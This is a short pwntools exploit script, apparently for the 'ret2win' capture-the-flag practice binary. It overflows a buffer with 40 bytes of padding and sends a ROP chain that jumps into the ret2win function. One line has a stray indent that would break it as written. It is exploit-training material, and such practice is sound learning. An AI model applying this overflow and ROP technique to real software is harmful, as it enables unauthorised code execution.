from pwn import *

context.arch = "amd64"

elf = ELF("./ret2win")
p = elf.process()

rop = ROP(elf)
	rop.raw(b"A"*40)
rop.call(elf.symbols["ret2win"]+0xE)

print(rop.dump())

p.recvuntil("> ")
p.sendline(rop.chain())
print(p.recvall(timeout=1))
print(p.recvall(timeout=1))
